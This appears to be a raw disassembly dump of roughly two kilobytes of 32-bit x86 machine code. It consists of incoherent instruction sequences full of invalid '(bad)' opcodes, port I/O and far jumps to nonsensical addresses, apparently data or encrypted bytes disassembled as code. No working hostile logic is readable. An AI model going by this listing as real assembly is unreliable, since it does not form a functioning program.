  417111:	(bad)  
  417112:	cmp    ebx,ecx
  417114:	sti    
  417115:	or     ebx,DWORD PTR [eax-0x20415da6]
  41711b:	push   cs
  41711c:	lds    ebx,FWORD PTR [esi]
  41711e:	mov    al,ds:0xa092bede
  417123:	pop    ds
  417124:	leave  
  417125:	nop
  417126:	mov    ecx,0x68b59cf5
  41712b:	in     eax,0xbf
  41712d:	sar    BYTE PTR [edi],1
  41712f:	repnz popa 
  417131:	or     BYTE PTR [ebx],bh
  417133:	leave  
  417134:	pop    ebx
  417135:	dec    ecx
  417136:	iretw  
  417138:	add    BYTE PTR [edi-0x4544c48c],0xff
  41713f:	sbb    BYTE PTR gs:[ebp+0x6e604bc2],0x87
  417147:	push   es
  417148:	and    ebp,DWORD PTR [esi-0x8dc537f]
  41714e:	ins    DWORD PTR es:[edi],dx
  41714f:	retf   0x21
  417152:	iret   
  417153:	call   0xb984:0x9d22d9b8
  41715a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41715b:	sub    eax,0xe9a412da
  417160:	jge    0x41711f
  417162:	mov    cl,0xe3
  417164:	add    esi,DWORD PTR [edx+0x58962ac5]
  41716a:	jne    0x417180
  41716c:	jbe    0x417120
  41716e:	std    
  41716f:	out    dx,al
  417170:	imul   esp,DWORD PTR [esi+ebx*4-0x5f],0xeddffdc0
  417178:	sub    esp,edi
  41717a:	jne    0x417172
  41717c:	jg     0x41719d
  41717e:	dec    eax
  41717f:	pop    ss
  417180:	addr16 dec ecx
  417182:	cmp    DWORD PTR [ecx+0x1f0e4ada],ebx
  417188:	sbb    BYTE PTR [edi+0x6d],bh
  41718b:	jmp    0x4171a8
  41718d:	cmp    eax,0xebc09a44
  417192:	es sbb al,0xab
  417195:	outs   dx,DWORD PTR ds:[esi]
  417196:	xor    BYTE PTR [edx-0x3d],dh
  417199:	imul   edi,DWORD PTR [edx+0x23e3434],0x7
  4171a0:	es jle 0x41714d
  4171a3:	scas   al,BYTE PTR es:[edi]
  4171a4:	fisubr WORD PTR [edi+0x17]
  4171a7:	mov    ss,WORD PTR [edi]
  4171a9:	push   ebx
  4171aa:	jbe    0x417154
  4171ac:	sub    eax,DWORD PTR [eax+0x3e811c27]
  4171b2:	inc    ecx
  4171b3:	dec    ebp
  4171b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171b5:	mov    ah,0xf6
  4171b7:	add    eax,0xb84cb267
  4171bc:	adc    edi,ebx
  4171be:	and    edi,DWORD PTR [ecx-0x46]
  4171c1:	jmp    DWORD PTR [ecx+0x24]
  4171c4:	pop    eax
  4171c5:	mov    bh,0xe
  4171c7:	adc    DWORD PTR [esi-0x57bb58b0],ebx
  4171cd:	mov    fs,esp
  4171cf:	and    DWORD PTR ds:0x8ea8c248,ebx
  4171d5:	mov    BYTE PTR [edi+0x33],al
  4171d8:	lea    ecx,[edi-0xa7632ef]
  4171de:	out    0x63,al
  4171e0:	mov    ebx,0xfb56715e
  4171e5:	shl    DWORD PTR [ebp-0x3eef9b7d],1
  4171eb:	push   esp
  4171ec:	xor    al,0x3
  4171ee:	push   esi
  4171ef:	daa    
  4171f0:	sub    al,0xe0
  4171f2:	imul   ecx,DWORD PTR [esi-0x1e],0xffffffe9
  4171f6:	mov    al,0xe2
  4171f8:	xor    eax,0x6fbbc83
  4171fd:	sub    eax,0xf79bcda0
  417202:	hlt    
  417203:	dec    edi
  417204:	mov    cl,BYTE PTR [edi]
  417206:	jne    0x4171eb
  417208:	xor    eax,0xbf312caa
  41720d:	out    dx,eax
  41720e:	adc    eax,0x326b5907
  417213:	lods   eax,DWORD PTR ds:[esi]
  417214:	xchg   DWORD PTR [ebx+0x73c9e554],esi
  41721a:	pop    ecx
  41721b:	mov    BYTE PTR [edi],cl
  41721d:	hlt    
  41721e:	shl    bl,1
  417220:	sub    dl,BYTE PTR [ecx-0x15]
  417223:	loop   0x4171c9
  417225:	sbb    bh,BYTE PTR [eax-0x43d8e47e]
  41722b:	add    DWORD PTR [ebx+ebp*2-0x44],eax
  41722f:	ss mov dl,0x97
  417232:	mov    esi,0xba9665bb
  417237:	add    al,0x4e
  417239:	in     al,dx
  41723a:	mov    edi,0xec0edb0d
  41723f:	cmp    bh,BYTE PTR [ebp+0x40]
  417242:	push   ebx
  417243:	daa    
  417244:	or     eax,ebx
  417246:	xchg   edx,eax
  417247:	out    dx,al
  417248:	jmp    0x5827:0xeb4be483
  41724f:	add    al,0x61
  417251:	dec    ebp
  417252:	sub    al,0xf2
  417254:	clc    
  417255:	out    dx,eax
  417256:	and    BYTE PTR [ecx],ah
  417258:	adc    dl,BYTE PTR [edx]
  41725a:	ins    DWORD PTR es:[edi],dx
  41725b:	loop   0x4171f4
  41725d:	rol    BYTE PTR [edi+ecx*2-0x4e9f9eb0],1
  417264:	or     esi,DWORD PTR [ecx]
  417266:	into   
  417267:	inc    ebx
  417268:	mov    edx,0xe2a79632
  41726d:	je     0x41722c
  41726f:	dec    ebp
  417270:	aaa    
  417271:	je     0x417253
  417273:	jge    0x4172dd
  417275:	aad    0xc5
  417277:	js     0x417294
  417279:	sub    ebx,DWORD PTR [esi-0x78]
  41727c:	adc    eax,DWORD PTR [eax]
  41727e:	test   eax,0xb68f57b7
  417283:	dec    eax
  417284:	add    al,0x6c
  417286:	sahf   
  417287:	push   cs
  417288:	push   ebp
  417289:	xchg   ecx,eax
  41728a:	xor    dh,ch
  41728c:	push   ebp
  41728d:	add    ebx,DWORD PTR [edx]
  41728f:	push   esi
  417290:	inc    esp
  417291:	(bad)  
  417292:	jnp    0x4172ce
  417294:	jmp    0x219751e1
  417299:	push   eax
  41729a:	pop    di
  41729c:	dec    edi
  41729d:	jp     0x4172e8
  41729f:	xchg   ebx,eax
  4172a0:	ret    0x2b19
  4172a3:	mov    ch,0xd4
  4172a5:	pop    edx
  4172a6:	cld    
  4172a7:	outs   dx,DWORD PTR ds:[esi]
  4172a8:	sub    ecx,DWORD PTR [ebx+0x52]
  4172ab:	rcr    DWORD PTR [eax+esi*4+0x3e37b95e],0x9a
  4172b3:	push   ds
  4172b4:	lahf   
  4172b5:	sbb    esp,ecx
  4172b7:	leave  
  4172b8:	adc    esi,DWORD PTR [ecx]
  4172ba:	lods   al,BYTE PTR ds:[esi]
  4172bb:	or     BYTE PTR [ecx+eax*1],0x6
  4172bf:	(bad)  
  4172c0:	sub    ecx,eax
  4172c2:	xor    ah,BYTE PTR [eax+ebx*2+0x5c]
  4172c6:	xchg   edx,eax
  4172c7:	into   
  4172c8:	cmp    dl,bh
  4172ca:	sti    
  4172cb:	and    bl,BYTE PTR [ecx]
  4172cd:	push   0xe4381416
  4172d2:	in     eax,dx
  4172d3:	cmp    DWORD PTR [edx+0x0],esp
  4172d6:	xchg   BYTE PTR [edi+0x6a],ah
  4172d9:	push   ss
  4172da:	push   edx
  4172db:	cdq    
  4172dc:	int3   
  4172dd:	aas    
  4172de:	mov    ebp,0xa4c6e2f9
  4172e3:	adc    BYTE PTR [ecx+0x2dbb750e],ah
  4172e9:	or     BYTE PTR [edi-0x5b],al
  4172ec:	sbb    ebx,esi
  4172ee:	jmp    0xabb0:0x8b63e79a
  4172f5:	jo     0x4172ff
  4172f7:	inc    edi
  4172f8:	pop    ebx
  4172f9:	rcl    ah,0xf5
  4172fc:	xchg   ebx,eax
  4172fd:	loope  0x417328
  4172ff:	cmc    
  417300:	dec    eax
  417301:	in     al,dx
  417302:	cmc    
  417303:	xor    eax,0x3b00a80
  417308:	xor    al,0xf6
  41730a:	inc    edi
  41730b:	jmp    0x7551:0xb1c070de
  417312:	pop    ecx
  417313:	dec    ebp
  417314:	adc    BYTE PTR [edi+eax*1+0x75],ah
  417318:	adc    al,BYTE PTR [ebx]
  41731a:	mov    ch,0x75
  41731c:	dec    ebx
  41731d:	and    DWORD PTR [edi],edi
  41731f:	pop    ecx
  417320:	retf   
  417321:	std    
  417322:	inc    esp
  417323:	adc    BYTE PTR [ebp+0x35a4442],bl
  417329:	or     DWORD PTR [ecx],eax
  41732b:	out    0x55,eax
  41732d:	pop    ecx
  41732e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41732f:	retf   0x4095
  417332:	pop    ebx
  417333:	test   ecx,ebp
  417335:	push   esi
  417336:	inc    edx
  417337:	cmp    al,0xbc
  417339:	push   esp
  41733a:	jp     0x4173a9
  41733c:	int    0x4a
  41733e:	and    dl,ch
  417340:	cmp    DWORD PTR [ebp-0x7a32d6ca],0xc9fc4f95
  41734a:	repz test al,0x28
  41734d:	sbb    dl,BYTE PTR [esi]
  41734f:	add    dh,BYTE PTR [eax+edx*2+0x48bdb03d]
  417356:	inc    eax
  417357:	out    0xb8,al
  417359:	pop    esp
  41735a:	lahf   
  41735b:	xchg   esi,eax
  41735c:	cmp    dl,al
  41735e:	lods   eax,DWORD PTR ds:[esi]
  41735f:	das    
  417360:	imul   ebp,DWORD PTR [eax-0x4e],0xffffffb7
  417364:	add    BYTE PTR [ecx+esi*1],al
  417367:	js     0x4173c1
  417369:	and    al,ch
  41736b:	ss aad 0xd4
  41736e:	loope  0x417345
  417370:	jnp    0x4172fa
  417372:	mov    BYTE PTR [edx+0x484e5119],al
  417378:	shl    BYTE PTR ds:0xc18d7bf9,1
  41737e:	cld    
  41737f:	mov    ch,0x9b
  417381:	lods   al,BYTE PTR ds:[esi]
  417382:	jne    0x417313
  417384:	lock xor eax,DWORD PTR [edx]
  417387:	mov    cl,0xdb
  417389:	aam    0x81
  41738b:	mov    ecx,0xd344cbf4
  417390:	or     esp,0x3e0ba69a
  417396:	pusha  
  417397:	mov    dl,0x8e
  417399:	sub    BYTE PTR [eax+0x68],ah
  41739c:	inc    esi
  41739d:	pop    es
  41739e:	and    al,0x2b
  4173a0:	adc    bl,cl
  4173a2:	rcr    DWORD PTR [edi-0x549597df],0xaf
  4173a9:	push   edx
  4173aa:	and    eax,0x51be5b4
  4173af:	mov    ch,0x88
  4173b1:	mov    eax,0x9ccb5127
  4173b6:	push   esi
  4173b7:	aad    0x2b
  4173b9:	jnp    0x4173af
  4173bb:	jmp    0x6e75160b
  4173c0:	xor    ebp,DWORD PTR [esi]
  4173c2:	mov    edx,0xf7d5b105
  4173c7:	xor    eax,0x2c8bef61
  4173cc:	stos   BYTE PTR es:[edi],al
  4173cd:	mov    DWORD PTR [ebx+edi*4+0x7310611a],esi
  4173d4:	or     eax,0x1a041ee
  4173d9:	icebp  
  4173da:	xor    al,0xdd
  4173dc:	sbb    DWORD PTR [ecx-0x28],ecx
  4173df:	mov    eax,0xa115a64e
  4173e4:	nop
  4173e5:	xchg   esi,eax
  4173e6:	fwait
  4173e7:	pop    esi
  4173e8:	inc    edx
  4173e9:	mov    ah,bh
  4173eb:	push   0xc95e142d
  4173f0:	ror    BYTE PTR [edx-0x5e27ffa4],1
  4173f6:	xor    al,bl
  4173f8:	inc    edx
  4173f9:	cwde   
  4173fa:	sbb    BYTE PTR [ebx],bl
  4173fc:	push   esi
  4173fd:	add    ah,BYTE PTR [edi-0x4f]
  417400:	clc    
  417401:	sub    ebx,DWORD PTR [ebp-0x27de9ccb]
  417407:	cmp    ebp,esi
  417409:	xlat   BYTE PTR ds:[ebx]
  41740a:	bound  ebx,QWORD PTR [ebx]
  41740c:	fst    DWORD PTR [eax+eiz*8-0x7b459ab4]
  417413:	icebp  
  417414:	jmp    0x6488:0xf5752a42
  41741b:	pop    ebx
  41741c:	mov    bh,0xbc
  41741e:	repz inc ebp
  417421:	add    edx,DWORD PTR [ecx+0x75]
  417424:	jae    0x41740d
  417426:	das    
  417427:	and    eax,0xffffff87
  41742a:	sti    
  41742b:	loope  0x417492
  41742d:	mov    eax,0x6bd13268
  417432:	or     eax,0xef0c03a3
  417437:	cmc    
  417438:	stc    
  417439:	test   eax,0x96bd68ba
  41743e:	(bad)  
  41743f:	sar    ebp,cl
  417441:	mov    esi,0xf58b634
  417446:	push   ss
  417447:	(bad)  
  417448:	mov    cs,WORD PTR [edx+0x56]
  41744b:	sbb    DWORD PTR [eax],esp
  41744d:	xchg   ebp,eax
  41744e:	inc    edx
  41744f:	sbb    esp,DWORD PTR [edi+0xe77f6d4]
  417455:	pop    edx
  417456:	sbb    al,BYTE PTR [ebp+0x6e8f0839]
  41745c:	ret    0xedbb
  41745f:	inc    ebp
  417460:	retf   0xbad6
  417463:	sub    cl,BYTE PTR [ecx]
  417465:	sbb    BYTE PTR [ebx],cl
  417467:	aaa    
  417468:	mov    ebp,0x3065cd55
  41746d:	mov    dl,BYTE PTR [edx-0x63]
  417470:	retf   
  417471:	imul   ebp,DWORD PTR [eax+0x369b9ff1],0x40
  417478:	out    dx,eax
  417479:	gs das 
  41747b:	pop    es
  41747c:	(bad)  
  41747d:	fwait
  41747e:	ins    DWORD PTR es:[edi],dx
  41747f:	cdq    
  417480:	inc    ebp
  417481:	mov    esi,0xe8ebca55
  417486:	xlat   BYTE PTR ds:[ebx]
  417487:	sub    edx,DWORD PTR [ebp+0x13]
  41748a:	xchg   DWORD PTR [esi],edi
  41748c:	mov    eax,0xa8ed9736
  417491:	mov    bl,0xb5
  417493:	dec    edx
  417494:	jno    0x41750c
  417496:	pop    edi
  417497:	xor    bh,BYTE PTR [esi]
  417499:	xchg   ecx,eax
  41749a:	fxch   st(0)
  41749c:	inc    edx
  41749d:	push   eax
  41749e:	and    DWORD PTR [eax-0x35ce9564],ecx
  4174a4:	sbb    BYTE PTR [ebx+0x31d7b82f],dh
  4174aa:	in     al,0xc9
  4174ac:	aad    0x28
  4174ae:	sbb    eax,DWORD PTR [ebx+eiz*4]
  4174b1:	xor    al,0xb7
  4174b3:	mov    ebp,0xda6d6d6a
  4174b8:	mov    cl,0x75
  4174ba:	and    ah,0x53
  4174bd:	add    eax,0xb966a642
  4174c2:	or     DWORD PTR [ebp+0x3ea0c44d],0xffffffab
  4174c9:	xchg   ah,dl
  4174cb:	mov    ecx,0xd2065b76
  4174d0:	mov    ch,0xc1
  4174d2:	mov    ah,0x68
  4174d4:	or     esi,edi
  4174d6:	add    esp,DWORD PTR [esi]
  4174d8:	xlat   BYTE PTR ds:[ebx]
  4174d9:	rcr    BYTE PTR [ecx+0x56],1
  4174dc:	push   ebx
  4174dd:	xor    eax,0x8b8570f9
  4174e2:	dec    eax
  4174e3:	mov    ds:0xc109983b,al
  4174e8:	inc    esp
  4174e9:	adc    BYTE PTR [ebx-0x36299a03],ah
  4174ef:	or     eax,0x7b595309
  4174f4:	dec    BYTE PTR [ebp+ebx*4+0x6c]
  4174f8:	jecxz  0x41754b
  4174fa:	sbb    BYTE PTR [eax-0xb738db4],ch
  417500:	push   es
  417501:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417503:	xchg   esp,eax
  417504:	jnp    0x4174ce
  417506:	add    edi,DWORD PTR cs:[esi]
  417509:	mov    ?,WORD PTR [eax]
  41750b:	jecxz  0x4174d7
  41750d:	loopne 0x417558
  41750f:	xor    BYTE PTR [edi+ebx*2],dl
  417512:	sbb    ebx,eax
  417514:	add    eax,0x6ebd44b4
  417519:	icebp  
  41751a:	retf   0x5c85
  41751d:	jl     0x41754a
  41751f:	push   eax
  417520:	mov    WORD PTR [edx-0x3c8a8502],ss
  417526:	popa   
  417527:	outs   dx,BYTE PTR ds:[esi]
  417528:	or     ah,bh
  41752a:	fisttp WORD PTR [ebp-0x31]
  41752d:	inc    BYTE PTR [eax+0x71ddce0e]
  417533:	ror    BYTE PTR [edi+0x5a],cl
  417536:	sub    al,0xc2
  417538:	push   ebx
  417539:	cwde   
  41753a:	dec    esp
  41753b:	add    eax,0x6e95205c
  417540:	xchg   edx,eax
  417541:	fldcw  WORD PTR [edx]
  417543:	xchg   edx,eax
  417544:	popf   
  417545:	cmp    edx,DWORD PTR [esi-0x780e7b32]
  41754b:	jge    0x417550
  41754d:	pop    esp
  41754e:	ja     0x4175a4
  417550:	dec    esp
  417551:	pop    ds
  417552:	loop   0x417562
  417554:	es push ss
  417556:	jmp    0x9d7280a2
  41755b:	or     BYTE PTR [ebp-0x472189e4],ch
  417561:	cmp    eax,0xb596b3a1
  417566:	mov    DWORD PTR [edi-0x35c33262],esp
  41756c:	mov    fs,esi
  41756e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41756f:	mov    eax,0xf092ef82
  417574:	fstp   QWORD PTR [ebx]
  417576:	pop    DWORD PTR cs:[ebx+0x65cc35dd]
  41757d:	loopne 0x417539
  41757f:	data16 jne 0x4175eb
  417582:	push   edx
  417583:	clc    
  417584:	nop
  417585:	int3   
  417586:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  417588:	or     BYTE PTR [ebx],cl
  41758a:	push   ecx
  41758b:	je     0x41760b
  41758d:	inc    edx
  41758e:	es enter 0xf9de,0xaf
  417593:	xchg   ebx,eax
  417595:	clc    
  417596:	add    eax,0x137775e4
  41759b:	push   ebx
  41759c:	js     0x41752e
  41759e:	mov    es,WORD PTR [ebp-0x16]
  4175a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175a2:	and    ebx,DWORD PTR [esi-0x5]
  4175a5:	mov    ebx,0x461ba97b
  4175aa:	retf   
  4175ab:	retf   
  4175ac:	je     0x417570
  4175ae:	and    dh,BYTE PTR [eax+0x4d]
  4175b1:	xor    eax,0x70b3f991
  4175b6:	sbb    ecx,ebx
  4175b8:	int3   
  4175b9:	ja     0x4175b0
  4175bb:	cmp    edi,DWORD PTR [esi-0x13]
  4175be:	mov    cl,0xf
  4175c0:	jmp    0x7bc9d531
  4175c5:	sub    eax,0x2cce2ede
  4175ca:	cwde   
  4175cb:	xor    BYTE PTR ds:0xf3dbd4e5,ch
  4175d1:	jne    0x417579
  4175d3:	adc    BYTE PTR [edx+0x4d26df07],dh
  4175d9:	dec    eax
  4175da:	and    edi,DWORD PTR [ecx]
  4175dc:	adc    ecx,DWORD PTR [edi]
  4175de:	cwde   
  4175df:	jns    0x4175ad
  4175e1:	scas   eax,DWORD PTR es:[edi]
  4175e2:	test   eax,0xa2f8916
  4175e7:	les    ebp,FWORD PTR [ebx]
  4175e9:	repz addr16 shl cl,cl
  4175ed:	jge    0x417659
  4175ef:	imul   ebx,DWORD PTR [edx],0x21033886
  4175f5:	add    eax,0x5d9c5d14
  4175fa:	xlat   BYTE PTR ds:[ebx]
  4175fb:	aad    0x85
  4175fd:	dec    esp
  4175fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175ff:	out    0x23,al
  417601:	xchg   BYTE PTR [eax-0x57],dl
  417604:	inc    esi
  417605:	add    DWORD PTR [esi],ebx
  417607:	mov    ds:0x133a7da5,eax
  41760c:	cmp    al,0xb8
  41760e:	sub    DWORD PTR [eax-0x72b2bccb],edx
  417614:	xor    ch,dh
  417616:	mov    ds:0xa7921b40,eax
  41761b:	inc    eax
  41761c:	xchg   edi,eax
  41761d:	mov    bl,0xd8
  41761f:	adc    eax,0x4b7e465a
  417624:	loopne 0x4175fe
  417626:	add    bl,BYTE PTR [ebp+esi*4-0x5cd4fb1b]
  41762d:	fnsave ds:0x8c076b52
  417633:	fs sahf 
  417635:	in     al,0x69
  417637:	pop    ebp
  417638:	jge    0x417657
  41763a:	sar    DWORD PTR [esi+ebx*4-0x3b],0xda
  41763f:	jo     0x4176a8
  417641:	dec    edi
  417642:	and    ebx,DWORD PTR [edx-0x51da4526]
  417648:	adc    ebx,edi
  41764a:	test   al,0xff
  41764c:	fucomi st,st(4)
  41764e:	leave  
  41764f:	inc    ebx
  417650:	and    BYTE PTR [edi-0x72],0x7d
  417654:	loopne 0x417622
  417656:	lds    eax,FWORD PTR [eax+0x35]
  417659:	(bad)  
  41765b:	inc    edi
  41765c:	push   esp
  41765d:	pusha  
  41765e:	pop    esi
  41765f:	sbb    BYTE PTR [ebx+0x787ffe6b],dh
  417665:	xor    edi,DWORD PTR [ebp+0x1397155]
  41766b:	push   0x67668910
  417670:	or     ebp,DWORD PTR [eax+0x4395467a]
  417676:	jmp    0xc8e26e7b
  41767b:	sub    DWORD PTR [edi+0x6a],eax
  41767e:	loop   0x417696
  417680:	je     0x4176a4
  417682:	inc    dx
  417684:	adc    BYTE PTR [esi+edx*4+0x6584123b],bh
  41768b:	fisub  WORD PTR [ebp+ecx*8+0x30e5cd5]
  417692:	jp     0x41764b
  417694:	xor    DWORD PTR [ebx],0x87398a22
  41769a:	das    
  41769b:	dec    edx
  41769c:	out    dx,al
  41769d:	bound  edi,QWORD PTR [eax-0x2b]
  4176a0:	lock aas 
  4176a2:	leave  
  4176a3:	push   ecx
  4176a4:	jbe    0x4176d4
  4176a6:	std    
  4176a7:	and    BYTE PTR [ecx+edx*8-0x42],0x27
  4176ac:	les    esi,FWORD PTR [ecx+0x57]
  4176af:	mov    al,0x26
  4176b2:	jns    0x41769f
  4176b4:	out    dx,al
  4176b5:	mov    al,0x20
  4176b7:	sub    BYTE PTR ds:0x107eb1ca,0x54
  4176be:	inc    ebp
  4176bf:	fbstp  TBYTE PTR [esi+0x52]
  4176c2:	pop    ss
  4176c3:	sahf   
  4176c4:	lahf   
  4176c5:	inc    esp
  4176c6:	push   ecx
  4176c7:	in     eax,dx
  4176c8:	or     bl,ch
  4176ca:	cmc    
  4176cb:	push   0xf
  4176cd:	cld    
  4176ce:	inc    edx
  4176cf:	and    ch,BYTE PTR [edx+ecx*1]
  4176d2:	ins    DWORD PTR es:[edi],dx
  4176d3:	or     ch,bh
  4176d5:	les    esi,FWORD PTR [edi+0x3331be79]
  4176db:	sahf   
  4176dc:	mov    eax,0x535b2a6d
  4176e1:	lods   al,BYTE PTR ds:[esi]
  4176e2:	out    dx,eax
  4176e3:	sbb    ch,BYTE PTR [ebp-0x4b]
  4176e6:	lea    eax,ds:[eax-0x3a431da9]
  4176ed:	jp     0x4176d9
  4176ef:	cmp    ah,dh
  4176f1:	dec    ecx
  4176f2:	push   eax
  4176f3:	fmul   DWORD PTR [ebx]
  4176f5:	cdq    
  4176f6:	mov    ebp,eax
  4176f8:	test   DWORD PTR [eax+edi*2],ecx
  4176fb:	sbb    DWORD PTR [edi-0x5d1df924],edi
  417701:	and    BYTE PTR [eax+0x32],0x2f
  417705:	fcomp  QWORD PTR [ecx+0x1d]
  417708:	xchg   edx,eax
  417709:	and    DWORD PTR [ebx-0x5f12b5c0],esi
  41770f:	stos   DWORD PTR es:[edi],eax
  417710:	sahf   
  417711:	mov    bl,0xbd
  417713:	scas   eax,DWORD PTR es:[edi]
  417714:	cmp    ebx,ebp
  417716:	xor    BYTE PTR [edx+0x3d5a290],0x8a
  41771d:	sbb    al,0x6c
  41771f:	(bad)  es:[esi-0x48]
  417723:	jmp    0x2767bfe4
  417728:	imul   esi,DWORD PTR [eax-0x1030c5a9],0x49
  41772f:	sbb    BYTE PTR [ebx],bh
  417731:	mov    bh,0xb5
  417733:	xor    bl,ah
  417735:	pop    eax
  417736:	or     al,0x46
  417738:	mov    edi,0x677e508d
  41773d:	pop    ds
  41773e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41773f:	mov    ds:0x21700bc9,al
  417744:	les    edi,FWORD PTR [edx-0x3a]
  417747:	ins    BYTE PTR es:[edi],dx
  417748:	(bad)
  41774b:	or     al,0xaa
  41774d:	pop    ebp
  41774e:	pop    ds
  41774f:	jae    0x417719
  417751:	mov    ds:0xedb75080,eax
  417756:	xor    esp,DWORD PTR [edx+0x69]
  417759:	lods   al,BYTE PTR ds:[esi]
  41775a:	iret   
  41775b:	or     eax,0xe3eaccc
  417760:	or     BYTE PTR [ebp+0x40],dh
  417763:	sbb    al,0xf3
  417765:	cdq    
  417766:	test   BYTE PTR gs:[ecx],ah
  417769:	add    eax,0x9e7d23a1
  41776e:	pop    edi
  41776f:	idiv   DWORD PTR ds:0x37c617f4
  417775:	cmp    BYTE PTR [ebp-0x77d5f5a],ah
  41777b:	adc    al,ch
  41777d:	and    BYTE PTR [ecx],dh
  41777f:	sub    eax,0x25529899
  417784:	add    esp,DWORD PTR [eax+0x20]
  417787:	and    bh,cl
  417789:	xor    eax,0x9d464070
  41778e:	je     0x417786
  417790:	pop    edx
  417791:	int    0x35
  417793:	out    dx,al
  417794:	shl    BYTE PTR [eax+0x7aaef231],cl
  41779a:	retf   
  41779b:	push   esp
  41779c:	xor    DWORD PTR [ebx+edi*8],0xffffffa0
  4177a0:	xor    DWORD PTR [ecx+0x28e63fad],0x3235e169
  4177aa:	mov    ah,0xa9
  4177ac:	jmp    0x422f46bf
  4177b1:	test   DWORD PTR [edx+0x2f],edx
  4177b4:	pusha  
  4177b5:	xchg   DWORD PTR [ecx+0x1647a455],esi
  4177bb:	ds dec eax
  4177bd:	xor    eax,0x4624d0e4
  4177c2:	in     al,dx
  4177c3:	pop    ds
  4177c4:	push   ds
  4177c5:	push   ecx
  4177c6:	loopne 0x4177ae
  4177c8:	in     eax,0x20
  4177ca:	xchg   ah,cl
  4177cc:	xchg   ebp,eax
  4177cd:	repnz sub DWORD PTR [eax+0x5d79e281],edx
  4177d4:	inc    ecx
  4177d5:	lods   al,BYTE PTR ds:[esi]
  4177d6:	sahf   
  4177d7:	daa    
  4177d8:	data16 ds icebp 
  4177db:	xchg   ecx,esi
  4177dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177de:	loopne 0x41785b
  4177e0:	call   0xc12d4215
  4177e5:	aam    0xd4
  4177e7:	push   0xa6873129
  4177ec:	addr16 dec ecx
  4177ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177ef:	mov    ecx,0x191f5df8
  4177f4:	or     ebx,ecx
  4177f6:	fwait
  4177f7:	dec    edi
  4177f8:	mov    al,ds:0x51acc201
  4177fd:	fwait
  4177fe:	mov    al,ds:0x726e5887
  417803:	and    esi,edi
  417805:	jp     0x4177ef
  417807:	pushf  
  417808:	inc    esp
  417809:	es popa 
  41780b:	jo     0x4177e3
  41780d:	into   
  41780e:	dec    esi
  41780f:	lods   al,BYTE PTR ds:[esi]
  417810:	ss aam 0x8f
  417813:	adc    bh,BYTE PTR [edx-0x7fd737aa]
  417819:	hlt    
  41781a:	out    0x9c,al
  41781c:	loop   0x41782f
  41781e:	data16 sbb ah,BYTE PTR [ecx-0x5e]
  417822:	scas   eax,DWORD PTR es:[edi]
  417823:	scas   al,BYTE PTR es:[edi]
  417824:	add    al,0xda
  417826:	dec    ebp
  417827:	ret    0x5676
  41782a:	ret    0x3314
  41782d:	add    al,0x22
  41782f:	aaa    
  417830:	jno    0x417878
  417832:	or     eax,0xdd85e854
  417837:	sbb    BYTE PTR [eax],ch
  417839:	mov    WORD PTR [ecx],gs
  41783b:	adc    edi,DWORD PTR [ebx]
  41783d:	cmp    eax,0x9ed1b46b
  417842:	dec    edi
  417843:	mov    WORD PTR ds:0x2d7007a8,ss
  41784a:	clc    
  41784b:	ins    DWORD PTR es:[edi],dx
  41784c:	sbb    BYTE PTR [ebx],ah
  41784e:	call   0x93f6:0xc7a3a886
  417855:	adc    bh,BYTE PTR [esi+0xdead4b7]
  41785b:	dec    ebx
  41785c:	mov    BYTE PTR [ebx+0x3f7403ea],dh
  417862:	sub    ah,BYTE PTR [edi]
  417864:	idiv   DWORD PTR [ecx+0x61b25844]
  41786a:	cmp    DWORD PTR [ebp+0x1d],esi
  41786d:	rol    BYTE PTR [esi+0x4da64acd],1
  417873:	xor    eax,0xc6e436a
  417878:	push   ss
  417879:	adc    BYTE PTR [edi],cl
  41787b:	stc    
  41787c:	(bad)  
  41787d:	enter  0x99a7,0x58
  417881:	mov    ebp,0xcac23211
  417886:	int3   
  417887:	mov    esp,0x4b4affbf
  41788c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41788d:	adc    esi,DWORD PTR [ecx+0x9]
  417890:	mov    esi,0x2325ec42
  417895:	adc    DWORD PTR [edx],ecx
  417897:	push   ds
  417898:	rcr    DWORD PTR [edi],1
  41789a:	and    BYTE PTR [edx-0x18],ah
  41789d:	add    dh,ch
  41789f:	imul   esp,DWORD PTR [ebp-0x266b5546],0x69
  4178a6:	ja     0x417903
  4178a8:	bound  esp,QWORD PTR [ecx-0x1f301106]
  4178ae:	push   es
  4178af:	adc    al,0xd
  4178b1:	adc    BYTE PTR [esi+0x53],0xa5
  4178b5:	ins    DWORD PTR es:[edi],dx
  4178b6:	sub    eax,0xa723a20c
  4178bb:	add    ch,dl
  4178bd:	add    dh,BYTE PTR [edx+0x44]
  4178c0:	stc    
  4178c1:	aaa    
  4178c2:	xchg   ah,dl
  4178c4:	mov    bh,BYTE PTR [eax]
  4178c6:	inc    eax
  4178c7:	jmp    0x417917
  4178c9:	cmp    bh,bl
  4178cb:	jmp    0x4f7:0xa2906226
  4178d2:	enter  0x4175,0xbc
  4178d6:	jae    0x417898
  4178d8:	shr    BYTE PTR [eax-0x7c8d7d86],cl
  4178de:	ret    
  4178df:	xor    cx,WORD PTR [esi+0x355ec375]
  4178e6:	add    BYTE PTR [edi-0x69251619],al
  4178ec:	adc    ebp,DWORD PTR [eax+0x34]
  4178ef:	cs jbe 0x4178ef
  4178f2:	std    
  4178f3:	xchg   esi,eax
  4178f4:	xor    eax,0x2e9cc80f
  4178f9:	jo     0x41793f
  4178fb:	mov    ecx,0xf00eb145
  417900:	inc    DWORD PTR [eax-0x43cd380]
  417906:	mov    ebx,0xa09ffc16
  41790b:	sbb    BYTE PTR [ebx],dh
  41790d:	push   edx
  41790e:	add    eax,0x4f1533ab
  417913:	call   0x9cb1:0x320720e3
  41791a:	push   esp
  41791b:	cmp    dl,BYTE PTR [edi]
  41791d:	aad    0x81
  41791f:	and    dl,dl
  417921:	retf   
  417922:	dec    edi
  417923:	ret    
